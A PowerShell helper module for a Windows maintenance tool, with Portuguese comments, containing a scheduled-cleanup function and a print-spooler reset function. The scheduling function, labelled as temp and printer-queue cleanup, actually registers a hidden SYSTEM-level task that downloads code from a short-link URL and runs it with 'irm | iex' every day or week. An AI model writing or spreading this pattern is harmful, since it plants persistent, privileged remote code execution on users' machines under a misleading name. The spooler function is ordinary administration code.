# Arquivo: modules/other.ps1
# Descrição: Funções auxiliares para o script principal.

# Função para fazer agendar tarefa de limpeza do temp diaria e limpa fila da impressora
function AgendarTarefa {
    Write-Log "Agendador de Tarefas de Limpeza Automática"
    Write-Host "[1] Diariamente"
    Write-Host "[2] Semanalmente (Domingo)"
    Write-Host "[3] Cancelar"
    
    $escolha = Read-Host "Escolha a frequência"
    
    $trigger = $null
    switch ($escolha) {
        "1" { $trigger = New-ScheduledTaskTrigger -Daily -At "3am" }
        "2" { $trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At "3am" }
        "3" {
            return 
        }
        default {
            Write-Host "Opção inválida." -ForegroundColor Red
            Pause
            return
        }
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"irm https://duckurl.vercel.app/nGCd3W | iex`""
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\System" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -WakeToRun
    
    try {
        Register-ScheduledTask -TaskName "Limpeza Automatica DuckDev" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
        Write-Log "✅ Tarefa 'Limpeza Automatica DuckDev' agendada com sucesso!" -ForegroundColor Green
    }
    catch {
        Write-Log "❌ Falha ao agendar a tarefa. $($_.Exception.Message)" -ForegroundColor Red
    }
    Read-Host "`nPressione ENTER para voltar ao menu"
}

function Limpar-FilaImpressao {
    Write-Log "Tentando limpar a fila de impressão..." -ForegroundColor Yellow
    
    try {
        Stop-Service -Name "Spooler" -Force -ErrorAction Stop
        Write-Log "Serviço de spooler de impressão parado."
        
        $printQueuePath = "$env:SystemRoot\System32\spool\PRINTERS\*.*"
        if (Test-Path $printQueuePath) {
            Remove-Item -Path $printQueuePath -Force -ErrorAction Stop
            Write-Log "Ficheiros da fila de impressão removidos."
        } else {
            Write-Log "Nenhum ficheiro na fila de impressão para remover."
        }
        
        Start-Service -Name "Spooler"
        Write-Log "Serviço de spooler de impressão iniciado."
        Write-Log "✅ Fila de impressão limpa com sucesso!" -ForegroundColor Green
    }
    catch {
        Write-Log "❌ Falha ao limpar a fila de impressão: $($_.Exception.Message)" -ForegroundColor Red
        Write-Log "Tentando reiniciar o serviço de spooler de qualquer maneira..."
        Start-Service -Name "Spooler" -ErrorAction SilentlyContinue
    }
    Read-Host "`nPressione ENTER para voltar ao menu"
}